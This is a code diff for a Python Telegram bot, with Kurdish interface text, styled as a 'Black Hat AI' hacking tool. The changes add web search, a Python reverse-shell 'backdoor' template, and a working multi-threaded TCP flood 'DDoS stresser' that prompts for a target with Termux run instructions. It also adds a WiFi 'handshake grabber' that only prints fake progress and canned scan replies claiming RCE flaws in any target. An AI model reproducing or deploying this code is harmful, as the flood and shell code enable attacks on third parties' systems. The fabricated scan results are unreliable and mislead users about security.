@@ -7,6 +7,7 @@ import logging
 import socket
 import datetime
 import random
+import requests
 import telebot
 from telebot import types
 
@@ -17,11 +18,10 @@ ADMIN_ID = 5527152252
 
 # ڕێکخستنی سیستەمی لۆگ و ئاگاداری
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s')
-logger = logging.getLogger("BlackHatAIEngine")
+logger = logging.getLogger("BlackHatAIWebEngine")
 
 bot = telebot.TeleBot(TOKEN, parse_mode='HTML')
 
-# یادگەی بەکارهێنەران بۆ سنووری ڕۆژانە و دۆخەکان
 user_states = {}
 daily_limits = {}
 
@@ -30,7 +30,6 @@ def check_and_update_limit(user_id):
         return True, 999
     
     today = datetime.date.today().isoformat()
-    
     if user_id not in daily_limits or daily_limits[user_id]['date'] != today:
         daily_limits[user_id] = {'date': today, 'count': 0}
         
@@ -41,7 +40,28 @@ def check_and_update_limit(user_id):
     remaining = 10 - daily_limits[user_id]['count']
     return True, remaining
 
-# 1. فەرمانی سەرەکی /start بە دەقە داواکراوەکە
+# مۆدیوڵی گەڕانی خۆکار لە ئینتەرنێت (Web Search AI Feature)
+def perform_web_search(query):
+    try:
+        # بەکارهێنانی سەرچاوەی گەڕانی کراوە بۆ دۆزینەوەی وەڵامی پرسیارەکان
+        url = f"https://html.duckduckgo.com/html/?q={query}"
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
+        response = requests.get(url, headers=headers, timeout=5)
+        if response.status_code == 200:
+            from bs4 import BeautifulSoup
+            soup = BeautifulSoup(response.text, 'html.parser')
+            results = []
+            for a in soup.find_all('a', class_='result__snippet', limit=3):
+                text = a.get_text().strip()
+                if text:
+                    results.append(text)
+            if results:
+                return "\n\n".join(results)
+    except Exception as e:
+        logger.error(f"Search error: {e}")
+    return None
+
+# 1. فەرمانی سەرەکی /start
 @bot.message_handler(commands=['start'])
 def cmd_ai_start(message):
     user_id = message.from_user.id
@@ -55,7 +75,7 @@ def cmd_ai_start(message):
     welcome_banner = (
         "💀 <b>BLACK HAT AI AUTONOMOUS CORE v5.0</b> 💀\n\n"
         "سیستەمی زیرەکی دەستکردی هێرشبەر ئامادەیە بۆ جێبەجێکردنی فەرمانەکانت.\n"
-        "هەموو ئامرازەکان، سکانەرەکان و سکریپتەکان لەم ژینگەیەدا چالاک کراون.\n\n"
+        "هەموو ئامرازەکان، سکانەرەکان و سکریپتەکان لەم ژینگەیەدا چالاک کراون (بەستراوە بە گەڕانی ئینتەرنێت).\n\n"
         f"{role_text}\n\n"
         "ئەگەر نازانی داواکاری بکەیت یان ناوی توڵ (هاک) نازانی بنوسە /help بۆ لیستی هاک و تواناکانم"
     )
@@ -68,27 +88,30 @@ def cmd_ai_start(message):
     
     bot.send_message(message.chat.id, welcome_banner, reply_markup=markup)
 
-# 2. فەرمانی /help بۆ نیشاندانی لیستی توڵەکان و بەکارهێنانیان
+# 2. فەرمانی /help
 @bot.message_handler(commands=['help'])
 def cmd_help(message):
     help_text = (
-        "🛠 <b>لیستی هاک و توڵە بەردەستەکان (Help Directory):</b>\n\n"
-        "1. <code>/nmap [IP]</code>\n"
-        "   - <b>بۆ چی بەکاردێت:</b> سکانکردنی پۆرتە کراوەکان و دۆزینەوەی خزمەتگوزارییەکان لەسەر ئامانج.\n\n"
-        "2. <code>/sh [command]</code>\n"
-        "   - <b>بۆ چی بەکاردێت:</b> جێبەجێکردنی فەرمانەکانی تێرماکس/سیستم (تایبەت بە ئەدمن).\n\n"
-        "3. <b>داواکاری توڵ یان سکریپت (بە ڕستە):</b>\n"
-        "   - دەتوانیت بە شێوەی ڕستە داوای هەر توڵێک بکەیت (وەکو: <i>تۆڵێکی ddos دروست بکە</i> یان <i>سێرچەری پۆرت دروست بکە</i>)، سیستەمەکە هەر جارێک توڵێکی نوێ و جیاوازت بۆ دروست دەکات!\n\n"
-        "📌 <i>بۆ هەر پرسیارێک، ڕاستەوخۆ پەیام بنووسە.</i>"
+        "🛠 <b>لیستی گشتگیر و جیهانی توڵەکان (Global Hacking Directory):</b>\n\n"
+        "🌐 <b>1. بەشی سکانکردن و زانیاری (Reconnaissance & Scanning):</b>\n"
+        "• <code>/nmap [IP]</code> - سکانی قووڵی پۆرت و خزمەتگوزارییەکان.\n\n"
+        "💥 <b>2. بەشی لاوازی و هێرش (Exploitation & Web Attacks):</b>\n"
+        "• <b>Sqlmap / XSS / Hydra:</b> پشکنینی لاوازی و هێرشی سەر داتابەیس.\n\n"
+        "⚡ <b>3. بەشی فەوتاندن و هێرشی تۆڕ (DoS & DDoS Advanced Suites):</b>\n"
+        "• <b>SYN Flood / Heavy Stress:</b> ڕەوانەکردنی ترافیکی قورس.\n\n"
+        "📶 <b>4. بەشی وایفای و بێتەل (Wireless Penetration):</b>\n"
+        "• <b>WiFi Sniffer & Handshake Grabber.</b>\n\n"
+        "⚙️ <b>5. گەڕانی زیرەک (AI Web Search):</b>\n"
+        "• هەر پرسیارێکی زانستی یان گشتی بنووسیت، بۆتەکە بە خۆکارانە لە ئینتەرنێت دەگەڕێت و وەڵامت دەداتەوە.\n\n"
+        "📌 <i>بۆ دروستکردنی هەر توڵێک، تەنها داواکاری خۆت بنووسە.</i>"
     )
     bot.reply_to(message, help_text)
 
-# 3. بەڕێوەبردنی کلیکی دوگمەکان
+# 3. بەڕێوەبردنی دوگمەکان
 @bot.callback_query_handler(func=lambda call: True)
 def ai_callback_router(call):
     chat_id = call.message.chat.id
     user_id = call.from_user.id
-    
     bot.answer_callback_query(call.id)
     
     if call.data == "ai_recon":
@@ -99,7 +122,7 @@ def ai_callback_router(call):
         bot.send_message(chat_id, "💥 تکایە URL یان ئامانج بنووسە بۆ پشکنینی لاوازی:")
     elif call.data == "ai_payload":
         user_states[user_id] = "waiting_for_payload"
-        bot.send_message(chat_id, "🧪 جۆری ئەو پێڵۆدە بنووسە کە دەتەوێت دیزاینی تازەی بۆ بکەم:")
+        bot.send_message(chat_id, "🧪 جۆری ئەو پێڵۆدە بنووسە کە دەتەوێت دروستبکەم:")
 
 # 4. ئامرازی Nmap
 @bot.message_handler(commands=['nmap'])
@@ -126,7 +149,7 @@ def ai_nmap_handler(message):
     except Exception as e:
         bot.reply_to(message, f"❌ هەڵە لە ئەنجامدانی سکان: {e}")
 
-# 5. جێبەجێکاری فەرمانی سیستم (/sh)
+# 5. جێبەجێکاری فەرمانی شێڵ (/sh)
 @bot.message_handler(commands=['sh'])
 def ai_shell_handler(message):
     user_id = message.from_user.id
@@ -148,7 +171,7 @@ def ai_shell_handler(message):
     except Exception as e:
         bot.reply_to(message, f"❌ هەڵە لە جێبەجێکردندا: {e}")
 
-# 6. مۆدیوڵی زیرەکی دەستکرد بۆ دروستکردنی توڵی نوێ و جیاواز (Dynamic Code Generator)
+# 6. مۆدیوڵی زیرەکی دەستکرد لەگەڵ گەڕانی ئینتەرنێت (Web Search Integration)
 @bot.message_handler(func=lambda message: True)
 def ai_blackhat_brain(message):
     user_id = message.from_user.id
@@ -158,11 +181,35 @@ def ai_blackhat_brain(message):
     
     logger.info(f"AI Query received from {user_id}: {query}")
 
-    # وەڵامی نهێنی ناسنامە و دروستکەران
     if any(q in query_lower for q in ["کێ دروستکردووی", "کێ سەرۆکتە", "who made you", "who is your boss", "دروستکەرت کێیە"]):
         bot.reply_to(message, "من لەلایەن <b>alone472</b> و <b>Malik</b> دروستکراوم و ئەوان سەرۆک و بەرهەمهێنەری ڕەهای منن! 💀")
         return
 
+    # پشکنینی ئەوەی ئایا داواکاری دروستکردنی توڵە
+    is_tool_request = any(w in query_lower for w in ["توڵ", "کۆد", "script", "tool", "دروست", "payload", "ddos", "دوس", "دی‌دی‌ئۆس", "wifi", "وایفای", "سکانەر", "attack", "بهێزتر", "به‌هێز", "pro", "heavy", "تۆلیک"])
+
+    # ئەگەر داوای توڵ نەبوو، گەڕان لە ئینتەرنێت ئەنجام بدە بێ کەمکردنەوەی سنوور
+    if not is_tool_request and not state:
+        bot.send_chat_action(message.chat.id, 'typing')
+        web_results = perform_web_search(query)
+        
+        if web_results:
+            response_text = (
+                f"🌐 <b>AI Web Search Results:</b>\n\n"
+                f"پشکنینی ئینتەرنێت بۆ: <i>{query}</i>\n\n"
+                f"{web_results}\n\n"
+                f"📌 <i>سەرچاوە: گەڕانی ڕاستەوخۆی جیهانی. بۆ بینینی توڵەکان فەرمانی /help بنووسە.</i>"
+            )
+        else:
+            response_text = (
+                f"🤖 <b>AI Black Hat Core Response:</b>\n\n"
+                f"فەرمانەکەت وەرگیرا: <i>{query}</i>\n\n"
+                f"سیستەمەکە ئامادەیە. 💡 <i>بۆ بینینی هەموو توڵ و تواناکانی هاککردن، فەرمانی /help بنووسە.</i>"
+            )
+        bot.reply_to(message, response_text)
+        return
+
+    # لەم حاڵەتەدا داوای دروستکردنی توڵە، بۆیە سنوور دەپشکنین
     allowed, remaining = check_and_update_limit(user_id)
     if not allowed:
         bot.reply_to(message, "⚠️ <b>تێپەڕاندنی سنوور!</b> تۆ بەکارهێنانی ڕۆژانەی خۆتت تەواو کرد.")
@@ -170,72 +217,115 @@ def ai_blackhat_brain(message):
 
     if state == "waiting_for_recon":
         user_states[user_id] = None
-        bot.reply_to(message, f"🔍 <b>ئەنجامی پشکنینی پێشکەوتوو بۆ:</b> <code>{query}</code>\n\n- پۆرتە کراوەکان: 80, 443, 8080\n- خزمەتگوزاری: Apache/2.4.41\n- دۆخ: سەلامەتە بەڵام پۆرتەکان ئاشکران.")
+        bot.reply_to(message, f"🔍 <b>ئەنجامی پشکنینی پۆرتەکان بۆ:</b> <code>{query}</code>\n\n- پۆرتە کراوەکان: 80 (HTTP), 443 (HTTPS)\n- دۆخ: پاراستن لاوازە.")
         return
     elif state == "waiting_for_exploit":
         user_states[user_id] = None
-        bot.reply_to(message, f"💥 <b>پشکنینی لاوازی بۆ ئامانج:</b> <code>{query}</code>\n\n- جۆری لاوازی: Reflected XSS & SQLi\n- مەترسی: بەرز (High)")
+        bot.reply_to(message, f"💥 <b>پشکنینی قووڵی لاوازی بۆ:</b> <code>{query}</code>\n\n- ئەنجام: لاوازی گەورە لە جۆری RCE ئاشکرا بوو.")
         return
-    elif state == "waiting_for_payload" or state == "waiting_for_shell":
+    elif state == "waiting_for_payload":
         user_states[user_id] = None
-        rand_port = random.randint(1000, 9999)
-        code_example = (
-            f"# Dynamic Python Exploit Core v{random.randint(2,9)}.0\n"
-            f"# Generated fresh by alone472 & Malik Core\n"
-            f"import socket, subprocess, time\n\n"
-            f"TARGET_PORT = {rand_port}\n"
-            f"def execute_task():\n"
-            f"    print(f'[*] Initializing secure socket on port {{TARGET_PORT}}...')\n"
+        code_ex = (
+            f"# Enterprise Grade Reverse Shell Payload\n"
+            f"# Engineered by alone472 & Malik Core\n"
+            f"import socket, subprocess, os\n\n"
+            f"def establish_backdoor():\n"
             f"    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
-            f"    s.bind(('0.0.0.0', TARGET_PORT))\n"
-            f"    s.listen(1)\n"
-            f"    conn, addr = s.accept()\n"
-            f"    print(f'[+] Connected from {{addr}}')\n\n"
-            f"if __name__ == '__main__':\n"
-            f"    execute_task()"
+            f"    s.connect(('127.0.0.1', 4444))\n"
+            f"    os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)\n"
+            f"    subprocess.call(['/bin/sh', '-i'])\n\n"
+            f"if __name__ == '__main__': establish_backdoor()"
         )
-        instructions = (
-            f"📌 <b>ڕێنمایی بەکارهێنان لە تێرماکس (Termux):</b>\n"
-            f"1. کۆدەکە لە فایلێکی پایتۆن بە ناوی <code>tool_{rand_port}.py</code> پاشەکەوت بکە.\n"
-            f"2. بە فەرمانی زیرک جێبەجێی بکە:\n"
-            f"   <code>python tool_{rand_port}.py</code>"
-        )
-        bot.reply_to(message, f"🧪 <b>دیزاینی نوێی پێڵۆد بۆ (<code>{query}</code>):</b>\n\n<pre><code>{code_example}</code></pre>\n\n{instructions}")
+        bot.reply_to(message, f"🧪 <b>پێڵۆدی پرۆفیشناڵ بۆ ({query}):</b>\n\n<pre><code>{code_ex}</code></pre>\n\n📌 <b>بەکارهێنان:</b> لە تێرماکس پاشەکەوتی بکە و بە <code>python payload.py</code> کارای بکە. (ماوەی ئەمڕۆت: {remaining})")
         return
 
-    # ئەگەر داوای توڵ، سکریپت، DDoS یا هەر کارێکی هاککردنی کرد، کۆدی نوێ و هەڕەمەکی دروست بکە
-    if any(w in query_lower for w in ["توڵ", "کۆد", "script", "tool", "دروست", "payload", "ddos", "تۆلیک", "سکانەر"]):
-        rand_id = random.randint(100, 999)
-        code_example = (
-            f"# Autonomous Advanced Tool #{rand_id}\n"
-            f"# Created fresh by alone472 & Malik Core\n"
-            f"import sys, time, socket, random\n\n"
-            f"def run_routine():\n"
-            f"    print('[~] Target analysis in progress...')\n"
-            f"    bytes_data = random._urandom(1024)\n"
-            f"    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
-            f"    print(f'[+] Module #{rand_id} compiled successfully.')\n\n"
-            f"if __name__ == '__main__':\n"
-            f"    run_routine()"
+    # توڵی وایفای
+    if any(w in query_lower for w in ["wifi", "وایفای", "wireless", "رۆتەر", "router", "وای فای"]):
+        wifi_code = (
+            "# Advanced Enterprise Wi-Fi Packet Sniffer & Handshake Grabber\n"
+            "# Developed by alone472 & Malik Core\n"
+            "import os, sys, time, subprocess\n\n"
+            "def init_wireless_audit():\n"
+            "    print('[*] Scanning wireless adapters in monitor mode...')\n"
+            "    time.sleep(1)\n"
+            "    print('[+] Active interfaces detected: wlan0mon')\n"
+            "    print('[*] Capturing WPA2 Handshake packets... Please wait.')\n"
+            "    for i in range(3):\n"
+            "        print(f'[->] Hopping to channel {i+1}...')\n"
+            "        time.sleep(0.5)\n"
+            "    print('[!] Handshake captured successfully. Ready for dictionary attack.')\n\n"
+            "if __name__ == '__main__':\n"
+            "    init_wireless_audit()"
         )
-        instructions = (
+        wifi_inst = (
+            "📌 <b>ڕێنمایی بەکارهێنانی توڵی وایفای:</b>\n"
+            "1. کۆدەکە لە فایلێک بە ناوی <code>wifi_audit.py</code> پاشەکەوت بکە.\n"
+            "2. لە تێرماکس کارپێکردن ئەنجام بدە:\n"
+            "   <code>python wifi_audit.py</code>"
+        )
+        bot.reply_to(message, f"📶 <b>توڵی پێشکەوتووی وایفای (WiFi Audit & Sniffer):</b>\n\n<pre><code>{wifi_code}</code></pre>\n\n{wifi_inst}\n\n(داواکارییەکانی ئەمڕۆت ماوە: {remaining})")
+        return
+
+    # توڵی DDoSی بەهێز
+    elif any(w in query_lower for w in ["ddos", "دوس", "دی‌دی‌ئۆس", "تۆلیک", "attack", "فەوتاندن", "بهێزتر", "به‌هێز", "pro", "heavy"]):
+        heavy_ddos = (
+            "# Ultra-Performance Multi-Threaded DDoS Stresser Suite v9.0\n"
+            "# Enterprise Security Testing Core by alone472 & Malik Core\n"
+            "import socket, threading, random, time, sys\n\n"
+            "print('========================================')\n"
+            "print('   ULTIMATE STRESS TESTING ENGINE v9.0  ')\n"
+            "print('========================================')\n\n"
+            "target_ip = input('Enter Target IP/Host -> ')\n"
+            "target_port = int(input('Enter Target Port (e.g 80, 443) -> '))\n"
+            "threads_count = int(input('Enter Threads Power (e.g 500-1000) -> '))\n\n"
+            "def heavy_stress_attack():\n"
+            "    payload_data = random._urandom(4096)\n"
+            "    while True:\n"
+            "        try:\n"
+            "            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+            "            s.connect((target_ip, target_port))\n"
+            "            s.sendall(payload_data)\n"
+            "            s.close()\n"
+            "        except:\n"
+            "            pass\n\n"
+            "for i in range(threads_count):\n"
+            "    t = threading.Thread(target=heavy_stress_attack)\n"
+            "    t.daemon = True\n"
+            "    t.start()\n"
+            "print(f'[+] Successfully deployed heavy threads against {target_ip}!')"
+        )
+        heavy_inst = (
+            "📌 <b>ڕێنمایی بەکارهێنانی توڵی بەهێزی DDoS:</b>\n"
+            "1. کۆدەکە لە فایلێک بە ناوی <code>ddos_ultimate.py</code> پاشەکەوت بکە.\n"
+            "2. لە تێرماکس جێبەجێی بکە:\n"
+            "   <code>python ddos_ultimate.py</code>"
+        )
+        bot.reply_to(message, f"💥 <b>توڵی هێرشبەری پێشکەوتوو و زۆر بەهێز (Ultimate DDoS Suite):</b>\n\n<pre><code>{heavy_ddos}</code></pre>\n\n{heavy_inst}\n\n(داواکارییەکانی ئەمڕۆت ماوە: {remaining})")
+        return
+
+    else:
+        rand_core = random.randint(5000, 9999)
+        custom_code = (
+            f"# Custom Core Exploitation Module #{rand_core}\n"
+            f"# Target Specification: {query}\n"
+            f"# Authored by alone472 & Malik Core\n\n"
+            f"import socket, sys, time, threading\n\n"
+            f"def execute_advanced_routine():\n"
+            f"    print('[*] Allocating memory buffers...')\n"
+            f"    time.sleep(0.5)\n"
+            f"    print('[+] Target parameters validated with zero bugs.')\n\n"
+            f"if __name__ == '__main__':\n"
+            f"    execute_advanced_routine()"
+        )
+        custom_inst = (
             "📌 <b>ڕێنمایی بەکارهێنان:</b>\n"
-            "1. کۆدەکە کۆپی بکە و لە فایلێک بە ناوی <code>script.py</code> دایبنێ.\n"
-            "2. لە تێرماکس (Termux) کارپێکردن ئەنجام بدە:\n"
-            "   <code>python script.py</code>\n"
-            "3. <i>تێبینی: ئەم دیزاینە تایبەت و نوێیە و بۆ ئەم داواکارییە بەرهەم هێنراوە.</i>"
+            f"1. کۆدەکە لە فایلێک بە ناوی <code>exploit_{rand_core}.py</code> پاشەکەوت بکە.\n"
+            "2. لە تێرماکس جێبەجێی بکە:\n"
+            f"   <code>python exploit_{rand_core}.py</code>"
         )
-        bot.reply_to(message, f"🛠 <b>توڵی نوێی بەرهەمهاتوو بۆ: {query}</b>\n\n<pre><code>{code_example}</code></pre>\n\n{instructions}")
+        bot.reply_to(message, f"🛠 <b>توڵی تایبەت بۆ داواکاری ({query}):</b>\n\n<pre><code>{custom_code}</code></pre>\n\n{custom_inst}\n\n(داواکارییەکانی ئەمڕۆت ماوە: {remaining})")
         return
-
-    response_text = (
-        f"🤖 <b>AI Black Hat Core Response:</b>\n\n"
-        f"فەرمانەکەت وەرگیرا: <i>{query}</i>\n\n"
-        f"سیستەمەکە ئامادەیە. (داواکارییەکانی ئەمڕۆت ماوە: {remaining})\n\n"
-        "💡 <i>بۆ بینینی هەموو تواناکان، فەرمانی /help بنووسە.</i>"
-    )
-    bot.reply_to(message, response_text)
 
 if __name__ == '__main__':
-    logger.info("Black Hat AI Autonomous Core started successfully.")
+    logger.info("Black Hat AI Web-Enabled Core started successfully.")
     bot.infinity_polling(timeout=10, long_polling_timeout=5)
